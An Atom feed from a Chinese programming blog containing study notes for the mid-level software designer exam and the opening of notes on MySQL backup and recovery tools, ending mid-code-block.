<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>月星墙的博客</title>
  
  <subtitle>Better Code, Better Life</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.aezo.cn/"/>
  <updated>2023-02-23T07:35:38.314Z</updated>
  <id>http://blog.aezo.cn/</id>
  
  <author>
    <name>smalle</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>软考中级</title>
    <link href="http://blog.aezo.cn/2022/10/14/others/%E8%BD%AF%E8%80%83%E4%B8%AD%E7%BA%A7/"/>
    <id>http://blog.aezo.cn/2022/10/14/others/软考中级/</id>
    <published>2022-10-14T13:40:00.000Z</published>
    <updated>2023-02-23T07:35:38.314Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>考试: 上午75分选择 + 下午75分大题, 均为笔试, 必须两门都在45分及以上才算通过</li><li>视频学习: 2021王寄清 软件设计师</li><li>必考题<ul><li><a href="https://www.bilibili.com/video/BV1LA4y1o79g?p=1" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1LA4y1o79g?p=1</a></li><li><a href="https://space.bilibili.com/91286799" target="_blank" rel="noopener">https://space.bilibili.com/91286799</a></li></ul></li></ul><h2 id="第一章-计算机组成与体系结构"><a href="#第一章-计算机组成与体系结构" class="headerlink" title="第一章:计算机组成与体系结构"></a>第一章:计算机组成与体系结构</h2><ul><li>考点(6分)<ul><li>数据的表示（4星)</li><li>运算器与控制器（4星)</li><li>Flynn分类法（2星)</li><li>CISC与RISC（2星)</li><li>流水线技术（4星)</li><li>存储系统（4星)</li><li>总线系统（1星)</li><li>可靠性（1星)</li><li>校验码（3星)</li></ul></li></ul><h3 id="数据表示"><a href="#数据表示" class="headerlink" title="数据表示"></a>数据表示</h3><ul><li>R进制转十进制(按权展开法)<ul><li>100 =&gt; <code>0*2^0 + 0*2^1 + 1*2^2 = 4</code> (R进制则底数为R)</li></ul></li><li><p>十进制转R进制(如短除法)</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 右边记录余数，然后从下往上开始排列数字即为 1100100</span></span><br><span class="line"><span class="comment"># R进制则出书为R</span></span><br><span class="line">100 / 2 =&gt; 0</span><br><span class="line">50  / 2 =&gt; 0</span><br><span class="line">25  / 2 =&gt; 1</span><br><span class="line">12  / 2 =&gt; 0</span><br><span class="line">6   / 2 =&gt; 0</span><br><span class="line">3   / 2 =&gt; 1</span><br><span class="line">1   / 2 =&gt; 1</span><br></pre></td></tr></table></figure></li><li><p>二进制转8进制</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 二进制 111 =&gt; 1*2^2 + 1*2^1 + 1*2^0 = 7 (如果是8进制，到7之后就要进位了)</span></span><br><span class="line"><span class="comment"># 所以3位二进制数可以转换为1位8进制数；反之，1位8进制数可转换为3位二进制数</span></span><br><span class="line">111 =&gt; 7</span><br><span class="line">11001 =&gt; 011 001 =&gt; 31 =&gt; O31(O开头)</span><br></pre></td></tr></table></figure></li><li><p>二进制转16进制</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 二进制 1111 =&gt; 1*2^3 + 1*2^2 + 1*2^1 + 1*2^0 = 15 (如果是16进制，到15之后就要进位了)</span></span><br><span class="line"><span class="comment"># 所以4位二进制数可以转换为1位16进制数；反之，1位16进制数可转换为4位二进制数</span></span><br><span class="line"><span class="comment"># 0-9 10/11/12/13/14/15=&gt; A/B/C/D/E/F</span></span><br><span class="line"><span class="comment"># F=1111, E=1110, D=1101, C=1100, B=1011, A=1010</span></span><br><span class="line">1111 =&gt; F</span><br><span class="line">11001 =&gt; 0001 1001 =&gt; 19 =&gt; Ox19(Ox开头) =&gt; 19H</span><br></pre></td></tr></table></figure></li><li><p>原码/反码/补码/移码</p><ul><li>高8位(左边第一位)为符号位，用来区分正数和负数，0表示正数，1表示负数；后7位为数据位</li><li>正数的原/补/反码一样；</li><li>负数的反码是基于原码取反(但符号位不变)，补码是基于反码加1(符号位不变)</li><li>移码是基于补码数据位不变，仅符号位取反</li><li><strong>下例可看出计算机是基于补码进行数学计算的</strong></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">        1               -1              1-1         =&gt; 等同于1+(-1)</span><br><span class="line">原码     0000 0001      1000 0001        1000 0010   =&gt; -2</span><br><span class="line">反码     0000 0001      1111 1110        1111 1111   =&gt; -127</span><br><span class="line">补码     0000 0001      1111 1111        0000 0000   =&gt; 0 (正确答案)</span><br><span class="line">移码     1000 0001      0111 1111        1000 0000   =&gt; -0</span><br></pre></td></tr></table></figure><h3 id="浮点运算"><a href="#浮点运算" class="headerlink" title="浮点运算"></a>浮点运算</h3><ul><li>浮点表示: N = 尾数 <em> 基数^指数 (3.14 </em> 10^3 = 0.314 * 10^4)</li><li>一般尾数用补码，阶码(指数位)用移码表示</li><li>运算过程: 对阶 - 尾数计算 - 结果格式化<ul><li>3.14 <em> 10^3 + 1.2 </em> 10^5 = 0.0314 <em> 10^5 + 1.2 </em> 10^5</li><li>对阶就是让指数位一致，对阶时，小数向大数看齐；对阶是通过比较小数的尾数右移实现的<br>-存储方式: 阶符(0/1)、阶数、尾符(0/1)、尾数</li></ul></li></ul><h3 id="计算机结构"><a href="#计算机结构" class="headerlink" title="计算机结构"></a>计算机结构</h3><ul><li>运算器<ul><li>算术逻想单元ALU：数据的算术运算和逻辑运算</li><li>累加寄存器AC：通用寄存器，为ALU提供一个工作区，用在暂存数据</li><li>数据缓冲奇存器DR：写内存时，暂存指令或数据</li><li>状态条件寄存器PSW ：存状态标志与控制标志（争议：也有将其归为控制器的）</li></ul></li><li>控制器<ul><li>程序计数器PC：存储下一条要执行指令的地址</li><li>指令寄存器IR：存储即将执行的指令</li><li>指令译码器ID：对指今中的操作码宇段进行分析解释</li><li>时序部件：提供时序控制信号</li></ul></li></ul><h3 id="计算机体系结构分类-Flynn"><a href="#计算机体系结构分类-Flynn" class="headerlink" title="计算机体系结构分类(Flynn)"></a>计算机体系结构分类(Flynn)</h3><ul><li>单指令流单数据流 SISD(I表示指令)</li><li>单指令流多数据流 SIMD: 控制部分一个，处理器和主存模块多个</li><li>多指令流单数据流 MISD</li><li>多指令流多数据流 MIMD</li></ul><h3 id="指令的基本概念"><a href="#指令的基本概念" class="headerlink" title="指令的基本概念"></a>指令的基本概念</h3><ul><li>组成: 操作码字段、地址码字段</li><li>三地址指令: a+b=c =&gt; +,a,b,c</li><li>二地址指令: a+=b =&gt; +,a,b</li><li>一地址指令: a++ =&gt; +,a</li></ul><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><ul><li>立即寻址(操作数在指令中)</li><li>直接寻址(存放主存储中操作数的地址)</li><li>间接寻址(存放的是地址的地址)</li><li>寄存器直接寻址</li><li>寄存器间接寻址</li></ul><h3 id="CISC与RISC指令集"><a href="#CISC与RISC指令集" class="headerlink" title="CISC与RISC指令集"></a>CISC与RISC指令集</h3><ul><li>CISC复杂</li><li>RISC精简<ul><li>指令: 数量少，定长格式，单周期，少寻址，只有Load/Store操作内存</li><li>实现方式: 增加了通用寄存器，硬布线逻辑控制为主，适合采用流水线</li></ul></li></ul><h3 id="流水线"><a href="#流水线" class="headerlink" title="流水线"></a>流水线</h3><ul><li>是指在程序执行时多条指令重叠进行操作时的一种并行处理技术</li><li>流水线周期是执行时间最长的一段的耗时</li><li>流水线计算公式<ul><li>理论公式 <code>1条指令执行时间 + (指令条数-1)*流水线周期</code></li><li>实践公式(将第1条指令的各个阶段都按流水线周期计算): <code>k*流水线周期 + (指令条数-1)*流水线周期</code> (k为指令执行包含k个阶段)</li></ul></li><li>吞吐率: 单位时间内完成的任务或输出结果的数量<ul><li>公式 <code>指令条数/流水线执行时间</code></li><li>最大吞吐率公式: <code>1/流水线周期</code></li></ul></li></ul><h3 id="层次化存储结构"><a href="#层次化存储结构" class="headerlink" title="层次化存储结构"></a>层次化存储结构</h3><ul><li>CPU(寄存器)</li><li>Cache: 按内容存取, 时间/空间</li><li>内存(主存): RAM/ROM</li><li>外存(辅存，如硬盘)</li></ul><h3 id="Cache"><a href="#Cache" class="headerlink" title="Cache"></a>Cache</h3><ul><li>映象<ul><li>直接相联映像：硬件电路较简单，但冲突率很高。</li><li>全相联映像：电路难于设计和实现，只适用于小容量的cache，冲突率较低</li><li>组相联映像：直接相联与全相联的折中</li></ul></li><li>地址映像是将主存与Cache的存储空间划分为若干大小相同的页（或称为块）<ul><li>例如，某机的主存容量为1GB，划分为2048页，每页512KB; Cache客最为8MB，划分为16页，每页512KB</li></ul></li></ul><h3 id="主存-编址与计算"><a href="#主存-编址与计算" class="headerlink" title="主存-编址与计算"></a>主存-编址与计算</h3><ul><li>按字节编址: 存储体的存储单元是字节存储单元，最小寻址单位是一个字节</li></ul><h3 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h3><ul><li>一条总线同一时刻仅允许-个设备发送，但允许多个设备接收。</li><li>总线的分类<ul><li>数据总线(Data Bus)</li><li>地址总线(Address Bus)</li><li>控制总线(Control Bus)</li></ul></li></ul><h3 id="校验码"><a href="#校验码" class="headerlink" title="校验码"></a>校验码</h3><ul><li>奇偶校验: 可检查1位的错误 (最后1位表示奇偶)</li><li>循环校验码CRC: 可检错，不可纠错 (将余数拼接在最后，传输后可整除则正确)</li><li>海明校验码: 可检错，也可纠错</li></ul><h2 id="第二章-操作系统"><a href="#第二章-操作系统" class="headerlink" title="第二章:操作系统"></a>第二章:操作系统</h2><ul><li>考点(6-8分)<ul><li>进程管理<ul><li>进程的状态(2星)</li><li>前趋图(3星)</li><li>信号量与PV操作(4星)</li><li>死锁及银行家算法(4星)</li></ul></li><li>存储管理<ul><li>段页式存储(4星)</li><li>页面置换算法(1星)</li></ul></li><li>文件管理<ul><li>绝对路径与相对路径(3星)</li><li>索引文件(2星)</li><li>位示图(2星)</li></ul></li><li>作业管理</li><li>设备管理<ul><li>虛设备与SPOOLING技术(1星)</li></ul></li></ul></li></ul><h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><ul><li>PV操作: P申请资源(没有则等待)，V释放资源(之后可唤醒其他进程)</li><li>S信号量(一般为可用资源数)</li><li>互斥模型: 多个进程共用一个打印机</li><li>同步模型: 单缓冲区生产者、消费者问题</li><li>死锁的避免<ul><li>有序资源分配法</li><li>银行家算法</li></ul></li></ul><h3 id="存储管理"><a href="#存储管理" class="headerlink" title="存储管理"></a>存储管理</h3><ul><li>页式存储: 将程序和内存均划分为同样大小的块，以页为单位将程序调入内存中<ul><li>优点: 利用率高、碎片小、分配管理简单</li><li>缺点: 增加了系统的开销，可能产生抖动现象</li></ul></li><li>段式存储: 按用户作业中的自然段来划分逻辑空间，段的长度可以不一样<ul><li>优点: 多道程序共享内存，各段程序修改互不影响</li><li>缺点: 利用率低，内存碎片大</li></ul></li><li>段页式存储: 先分段再分页</li><li>页面置换算法<ul><li>最优(OPT)算法</li><li>随机算法</li><li>先进先出(FIFO)，可能产生抖动</li><li>最近最少使用(LRU)</li></ul></li><li>磁盘管理<ul><li>读取数据时间: 寻道时间(磁头移动到磁道) + 寻找扇区时间(即旋转延迟) + 传输时间</li></ul></li><li>磁盘调度算法<ul><li>先来先服务FCFS</li><li>最短寻道时间优先SSTF</li><li>扫描算法SCAN</li><li>循环扫描算法CSCAN</li></ul></li></ul><h3 id="作业管理"><a href="#作业管理" class="headerlink" title="作业管理"></a>作业管理</h3><ul><li>作业调度算法<ul><li>先来先服务</li><li>时间片轮转法</li><li>短作业优先法</li><li>最高优先权法</li><li>高响应比优先法</li></ul></li></ul><h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><ul><li>索引文件结构</li></ul><h2 id="第三章-数据库系统"><a href="#第三章-数据库系统" class="headerlink" title="第三章:数据库系统"></a>第三章:数据库系统</h2><ul><li>考点(6-8分)<ul><li>数据库模式(2星)</li><li>ER模型(5星)</li><li>关系代数(3星)</li><li>规范化理论(5星)</li><li>SQL语言(4星)</li><li>并发控制(2星)</li><li>数据库完整性约束(1星)</li></ul></li></ul><h3 id="三级模式-两层映射"><a href="#三级模式-两层映射" class="headerlink" title="三级模式-两层映射"></a>三级模式-两层映射</h3><ul><li>三级模式<ul><li>外模式(视图级, 用户视图)</li><li>概念模式(表级, DBA视图)</li><li>内模式(文件级)</li></ul></li><li>数据库设计过程<ul><li>需求分析</li><li>概念结构设计(ER模型)</li><li>逻辑结构设计(关系模式)</li><li>物理设计</li></ul></li></ul><h3 id="E-R模型"><a href="#E-R模型" class="headerlink" title="E-R模型"></a>E-R模型</h3><ul><li>长方形: 实体<ul><li>长方形(含两条竖线): 弱实体</li></ul></li><li>椭圆形: 属性</li><li>菱形: 联系<ul><li>一条线中间有个小圆圈: 特殊化</li></ul></li><li>线上标记1/m/n: 表示1对1, 1对多, 多对多</li></ul><h3 id="规范化理论"><a href="#规范化理论" class="headerlink" title="规范化理论"></a>规范化理论</h3><ul><li>求候选建(业务主键): 使用图示法<ul><li>A -&gt; B -&gt; C, 此时侯选建为A</li><li>只有入没有出的肯定不是，箭头出的时候只要可以推导出其他所有节点即可(尽管有入的箭头也可以)</li></ul></li><li>所有侯选建的组合涉及到的字段即为主属性，其他为非主属性</li><li>范式，参考<a href="/_posts/db/sql-base.md#三范式">三范式</a><ul><li>1NF: 要有主键，列不可分</li><li>2NF: 不能存在部分依赖(每一个非主属性完全依赖侯选建)<ul><li>A,B-&gt;C, B-&gt;D 此时A,B如果为侯选建，则D不完全依赖A,B(仅依赖B)</li><li>可能存在数据冗余，增删改异常</li></ul></li><li>3NF: 不能存在传递依赖<ul><li>A-&gt;B-&gt;C, 此时不能把这个3个字段放到一张表，否则存在传递依赖</li><li>有传递依赖则为(仅符合)2NF</li></ul></li><li>BCNF(第4范式): 消除主属性对侯选建的部分和传递依赖</li></ul></li><li><p>模式分解</p><ul><li>将关系R(A,B,C,D,E)分解成多个关系p={R1(A,B,C),R1(A,D,E)}</li><li>如果分解之后的模式可以还原成原关系依赖，则为无损分解，否则为有损分解</li><li>公式法(仅限于分解后关系模式只有2个，否则只能用表格法): <code>R1^R2(交集) -&gt;(推导) R1-R2(差集) 或 R2-R1</code><ul><li>如关系R(A,B,C)，函数依赖F={A-&gt;B}<ul><li>当分解成 p1={R1(A,B), R2(A,C)} 此时交集为A, 差集为B、C, 所以存在关系依赖A-&gt;B、A-&gt;C, 任然存在F, 所以为无损</li><li>当分解成 p1={R1(A,B), R2(B,C)} 此时无法推导出F，所有为有损</li></ul></li></ul></li><li><p>表格法</p><p><img src="/data/images/linux/软考-模式分解-表格法.png" alt="软考-模式分解-表格法.png"></p></li></ul></li></ul><h2 id="第四章-计算机网络和网络安全"><a href="#第四章-计算机网络和网络安全" class="headerlink" title="第四章:计算机网络和网络安全"></a>第四章:计算机网络和网络安全</h2><ul><li>计算机网络考点(4分)<ul><li>开放系统互连参考横型（2星）</li><li>TCP/P协议族（4星）</li><li>IP地址与子网划分（5星）</li><li>网络规划与设计（1星）</li><li>3G与4G标准（2星）</li><li>HTML语言（2星）</li></ul></li><li>网络安全考点(3分)<ul><li>对称加密与非对称加密（3星）</li><li>信息摘要与数宇签名（2星）</li><li>数宇证书（2星）</li><li>网络安全协议（3星）</li><li>防火墙技术与网络攻击（3星）</li><li>计算机病毒与木马（3星）</li></ul></li><li><p>OSI七层模型和TCP/IP四层模型</p><p>  <img src="/data/images/linux/OSI七层模型.png" alt="OSI七层模型"></p><ul><li>链路层协议如: PPTP/L2TP</li><li>TCP传输: POP3邮件收取(110)、SMTP邮件发送(25)、FTP、HTTP、Telnet(23)</li><li>UDP传输: DHCP地址自动分配(67)、TFTP(69)、SNMP简单网络管理协议(161)、DNS域名解析协议(53)</li></ul></li><li>IP地址: 参考<a href="/_drafts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.md#IP地址划分">计算机网络.md</a></li><li>网络规划与设计<ul><li>需求分析</li><li>网络规划原则</li><li>网络设计与实时原则</li><li>层次化网络设计: 核心层、汇聚层、接入层<ul><li>Internet - 核心交换机 - 汇聚交换机(过滤) - 接入交换机</li></ul></li></ul></li><li>计算机网络分类<ul><li>分布范围: 局域网(LAN)、城域网(MAN)、广域网(WAN)、因特网    </li><li>拓扑: 总线、星型、环形</li><li>无线网络<ul><li>无线局域网: WLAN, 802.11, Wi-Fi</li><li>无线城域网: WMAN, 802.16, WiMax</li><li>无线广域网: WWAN, 3G/4G</li><li>无线个人网: WPAN, 802.15, Bluetooth</li></ul></li></ul></li><li>对称加密与非对称加密<ul><li>对称加密: 加密解密秘钥一样</li><li>非对称加密: 加密解密秘钥不一样(公钥和私钥), 但是是成对出现的<ul><li>A公钥加密只能用A私钥解密, B私钥加密只能用B公钥解密</li><li>如A给B发送加密信息时，可使用B的公钥加密，从而B使用私钥解密</li></ul></li></ul></li><li>数字签名<ul><li>A给B发送数字签名信息<ul><li>明文 - hash函数 - 消息摘要 - 用A的私钥加密(签名过程) - Internet</li><li>用A的公钥解密 - 得到消息摘要 - 和接受到的明文进行Hash函数获取的摘要比对 - 一致说明确实为A发送过来的信息</li></ul></li></ul></li><li>消息摘要<ul><li>使用MD5/SHA等函数加密成固定长度的散列值，基本不可逆</li><li>MD5使用128位，SHA使用160位，因此SHA安全性更高</li></ul></li><li>网络安全<ul><li>DoS(拒绝服务)</li></ul></li></ul><h2 id="第五章-系统开发基础"><a href="#第五章-系统开发基础" class="headerlink" title="第五章:系统开发基础"></a>第五章:系统开发基础</h2><ul><li>考点(11分)<ul><li>开发模型(5星)</li><li>软件开发方法(1星)</li><li>需求分析(1星)</li><li>软件设计(2星)</li><li>软件测试与维护<ul><li>白盒测试用例(4星)</li><li>软件维护类型(3星)</li><li>McCabe复杂度计算(4星)<br>— 软件质量保证(1星)</li></ul></li><li>软件过程改进(2星)</li><li>项目管理基础<ul><li>Gant图与Pert图(4星)</li><li>风险管理(3星)</li></ul></li></ul></li><li>开发模型<ul><li>瀑布模型<ul><li>确定需求，项目设计，编码</li><li>缺点: 无法解决设计阶段出现的问题</li></ul></li><li>V模型<ul><li>比较重视测试: 编码-单元测试, 集成测试, 系统测试, 验收测试</li><li>缺点: 测试晚于编码, 无法解决设计阶段问题</li></ul></li><li>喷泉模型<ul><li>面向对象的开发模型，每个阶段没有界限</li></ul></li><li>原型化模型<ul><li>通过与用户的重复沟通，得到原型</li><li>分为: 探索型、实验型、演化型(最终的原型可用于后续开发)</li></ul></li><li>螺旋模型<ul><li>基于瀑布模型+原型化模型</li><li>适合开发高风险项目</li></ul></li><li>统一过程(UP/RUP)<ul><li>以用例驱动, 以架构为中心, 迭代和增量</li><li>步骤: 初始、细化、构建、交付</li></ul></li><li>敏捷方法<ul><li>4大价值观: 沟通、简单、反馈、勇气(接收变更)</li><li>基本原则<ul><li>短平快的会议</li><li>小型版本发布</li><li>较少的文档</li><li>合作为重</li><li>客户直接参与</li><li>自动化测试</li><li>结对编程</li><li>测试驱动开发</li><li>持续集成</li><li>重构</li></ul></li><li>开发方法<ul><li>XP(极限编程)</li><li>Cockbum水晶系列方法</li><li>开放式源码</li><li>SCRUM(并列争球法)</li><li>Coad功用驱动开发</li><li>ASD</li></ul></li></ul></li></ul></li><li>软件开发方法<ul><li>结构化方法: 面向数据流的方法</li><li>原型法</li><li>面向对象方法</li><li>面向服务的方法</li><li>面向数据结构的方法: json</li></ul></li></ul><h2 id="第六章-面向对象技术"><a href="#第六章-面向对象技术" class="headerlink" title="第六章:面向对象技术"></a>第六章:面向对象技术</h2><ul><li>考点(12分)</li><li>UML图</li><li>设计模式</li></ul><h2 id="第七章-数据结构与算法基础"><a href="#第七章-数据结构与算法基础" class="headerlink" title="第七章:数据结构与算法基础"></a>第七章:数据结构与算法基础</h2><ul><li><p>考点(10分)</p></li><li><p>二叉树</p><ul><li>前序遍历: 根左右。对应前缀表达式</li><li>中序遍历: 左根右。对应中缀表达式</li><li>后续遍历: 左右根。对应后缀表达式</li></ul></li><li>树转二叉树<ul><li>孩子节点(第一个左节点) - 作为二叉树的左子树节点</li><li>兄弟节点(右边节点) - 作为(树的)左节点的(二叉树的)右子树节点</li></ul></li><li>查找二叉树<ul><li>左孩子小于根，右孩子大于根</li></ul></li><li>满二叉树<ul><li>约定编号从根结点起, 自上而下, 自左而右</li><li>无空节点，一定是完全二叉树</li></ul></li><li>完全二叉树<ul><li>约定编号同满二叉树</li><li>除去叶子节点，其他节点都包含两个子元素，如果最后一层的枝干节点正在填充叶子节点也算</li></ul></li><li>最优二叉树(哈夫曼树)<ul><li>节点数一定是奇数</li><li>只有度为0(无叶子节点)和2(有两个叶子节点)的节点，且度为0的节点比度为2的节点多1</li></ul></li><li>平衡二叉树<ul><li>整个树中任意节点的左子树和右子树的高度差的绝对值不大于1</li></ul></li><li>堆<ul><li>可以认为是完全二叉树</li></ul></li></ul><h2 id="第八章-程序设计语言与语言处理程序基础"><a href="#第八章-程序设计语言与语言处理程序基础" class="headerlink" title="第八章:程序设计语言与语言处理程序基础"></a>第八章:程序设计语言与语言处理程序基础</h2><ul><li>考点(3-5分)</li></ul><h2 id="第九章-多媒体基础知识"><a href="#第九章-多媒体基础知识" class="headerlink" title="第九章:多媒体基础知识"></a>第九章:多媒体基础知识</h2><ul><li>考点(3分)</li><li>计算图像大小<ul><li>知道像数，位数: 每个使素为16位，图像为640x480像素，求容量：640x480x16/8=614,400B (1Byte=8位)</li><li>知道像数，色数: 640x480使素，256色的图像，求容量：640x480xlog(256)/8=307,200B</li></ul></li><li>媒体的种类<ul><li>感觉媒体: 如声音人体能感知的</li><li>表示媒体: 人为构造出来的媒体，编码如文本编码、图像编码</li><li>显示媒体(表现媒体): 如键盘等输入输出设备</li><li>交换/转换媒体<ul><li>存储媒体</li><li>传输媒体</li></ul></li></ul></li></ul><h2 id="第十章-知识产权与标准化"><a href="#第十章-知识产权与标准化" class="headerlink" title="第十章:知识产权与标准化"></a>第十章:知识产权与标准化</h2><ul><li>考点(2分)</li><li>标准分类<ul><li>国际标准：ISO、IEC等国际标准化组织</li><li>国家标准：GB一-中国、ANSI-美国、BS一英国、J1S—日本</li><li>区域标准：又称为地区标准，如PASC—太平洋地区标准会议、CEN-欧洲标准委员会、ASAC—亚洲标准咨询委员会、ARSO—非洲地区标准化组织</li><li>行业标准：GJB一中国军用标准、MTT-S— 美国军用标准、IEEE— 美国电气电子工程师协会</li><li>地方标准：国家的地方一级行政机构制订的标准</li><li>企业标准</li><li>项目规范</li></ul></li><li>标准编号<ul><li>国际、国外标准代号：标准代号＋专业类号＋顺序号＋年代号</li><li>我国国家标准代号：强制性标准代号为GB、推荐性标准代号为GB/T、指导性标准代号为GB/Z、实物标准代号GSB</li><li>行业标准代号：由汉语拼音大写字母组成（特殊的如电子行业为SJ）</li><li>地方标准代号：由DB加上省级行政区代码的前两位</li><li>企业标准代号：由Q加上企业代号组成</li></ul></li></ul><h2 id="第十一章-数据流图"><a href="#第十一章-数据流图" class="headerlink" title="第十一章:数据流图"></a>第十一章:数据流图</h2><ul><li>考点(12-15分)</li><li>符号<ul><li>(外部)实体: 长方形, 为人或组织</li><li>箭头: 数据流</li><li>加工: 圆形或椭圆形</li><li>存文件: 长方形去掉一条或两条宽线</li></ul></li><li>数据流图平衡原则<ul><li>父图与子图之间的平衡</li><li>子图内平衡</li><li>DFD图: 顶层图到0层图的转换时，外部实体保持不变，且实体的流入流出保持不变</li><li>常见错误: 加工无进(奇迹)、或无出(黑洞)</li></ul></li></ul><h2 id="第十二章-数据库设计"><a href="#第十二章-数据库设计" class="headerlink" title="第十二章:数据库设计"></a>第十二章:数据库设计</h2><ul><li>考点(15分)</li><li>数据库设计过程<ul><li>需求分析: 得出数据流图</li><li>概念结构设计: 得出E-R模型</li><li>逻辑结构设计: 得出关系模式</li><li>物理设计</li></ul></li></ul><h2 id="第十三章-UML建模"><a href="#第十三章-UML建模" class="headerlink" title="第十三章:UML建模"></a>第十三章:UML建模</h2><ul><li>考点(15分)</li><li>类关系符号<ul><li>依赖: 虚线实三角</li><li>泛化: 实线虚三角</li><li>组合: 实线实菱形</li><li>聚合: 实线虚菱形</li><li>实现: 虚线虚三角</li></ul></li></ul><h2 id="第十四章-数据结构与算法应用"><a href="#第十四章-数据结构与算法应用" class="headerlink" title="第十四章:数据结构与算法应用"></a>第十四章:数据结构与算法应用</h2><ul><li>考点(10分)</li><li>算法<ul><li>分治法</li><li>回溯法: 有岔路口则一直往下走，走不通则回溯到上一个路口选择另外一条路往下走。如走迷宫</li><li>贪心法: 找到局部最优，不一定是整体最优。如装背包，找零钱</li><li>动态规划法: 先找到局部最优，最后找到整体最优</li></ul></li><li>时间复制度<ul><li>无循环: O(1)</li><li>k个嵌套循环: O(n^k)</li><li>某个循环一个元素基于二叉树: O(log_2_n)</li><li>堆排序: 每次重建的复杂度为 log_2_n，如果n个元素复杂度就为 nlog_2_n</li></ul></li></ul><h2 id="第十五章章-面向对象程序设计"><a href="#第十五章章-面向对象程序设计" class="headerlink" title="第十五章章:面向对象程序设计"></a>第十五章章:面向对象程序设计</h2><ul><li>C++<ul><li>派生类: <code>class CashNormal : public CashSuper {}</code></li><li>类外定义函数体: <code>double CashNormal :: acceptCash(double money) {}</code></li><li>虚函数: <code>virtual double acceptCash(double money) {}</code></li><li>纯虚函数: <code>virtual 函数类型 函数名(形惨列表) = 0</code> (主要是 = 0)<ul><li>如果类里面存在一个纯虚函数则此类为抽象类</li></ul></li><li>对象指针与对象引用<ul><li>对象指针: <code>类名 *对象指针名</code></li><li>对象引用: <code>类名 &amp;对象引用名 = 被引用的对象</code></li><li>使用 <code>-&gt;</code> 访问对象成员</li></ul></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;考试: 上午75分选择 + 下午75分大题, 均为笔试, 必须两门都在45分及以上才算通过&lt;/li&gt;
&lt;li&gt;视频学习: 202
      
    
    </summary>
    
      <category term="others" scheme="http://blog.aezo.cn/categories/others/"/>
    
    
      <category term="study" scheme="http://blog.aezo.cn/tags/study/"/>
    
  </entry>
  
  <entry>
    <title>Mysql数据备份与恢复</title>
    <link href="http://blog.aezo.cn/2022/09/17/db/mysql/mysql-backup-recover/"/>
    <id>http://blog.aezo.cn/2022/09/17/db/mysql/mysql-backup-recover/</id>
    <published>2022-09-17T13:48:00.000Z</published>
    <updated>2023-07-06T13:07:09.541Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数据备份-恢复"><a href="#数据备份-恢复" class="headerlink" title="数据备份/恢复"></a>数据备份/恢复</h2><ul><li>参考<a href="https://cloud.tencent.com/developer/article/1894635" target="_blank" rel="noopener">MySQL的数据备份与恢复</a></li><li><code>mysqldump</code> 是一款 mysql <strong>逻辑备份</strong>的工具(备份文件为SQL文件，CLOB字段需要设置参数转为二进制)，它将数据库里面的对象(表)导出作为 SQL 脚本文件<ul><li>对于导出几个 G 的数据库，还是不错的；一旦数据量达到几十上百 G，无论是对原库的压力还是导出的性能都存在问题 <a href="https://segmentfault.com/a/1190000019305858#item-2-5" target="_blank" rel="noopener">^1</a></li><li>支持基于innodb的热备份(加参数<code>--single-transaction</code>)；对myisam存储引擎的表，需加<code>--lock-all-tables</code>锁，防止数据写入</li><li>Mysqldump完全备份+二进制日志可以实现基于时间点的恢复。恢复的时候可关闭二进制日志，缩短恢复时间</li></ul></li><li><code>XtraBackup</code> 是由 <a href="https://www.percona.com/" target="_blank" rel="noopener">percona</a> 开源的免费数据库热备份软件，它能对 InnoDB 数据库和 XtraDB 存储引擎的数据库非阻塞地备份。对于较大数据的数据库可以选择<code>Percona-XtraBackup</code>备份工具，可进行全量、增量、单表备份和还原，percona早起提供的工具是 innobackupex<ul><li>xtrabackup：支持innodb存储引擎表，xtradb存储引擎表。支持innodb的物理热备份，支持完全备份，增量备份，而且速度非常快<br>    - innobackupex：支持innodb存储引擎表、xtradb存储引擎表、myisam存储引擎表</li></ul></li><li><code>mariadb10.3.x</code>及以上的版本用 Percona XtraBackup 工具会有问题，此时可以使用<code>mariabackup</code>，它是 MariaDB 提供的一个开源工具</li></ul><h2 id="Mysql相关语法"><a href="#Mysql相关语法" class="headerlink" title="Mysql相关语法"></a>Mysql相关语法</h2><h3 id="as和like复制表结构和数据"><a href="#as和like复制表结构和数据" class="headerlink" title="as和like复制表结构和数据"></a>as和like复制表结构和数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span 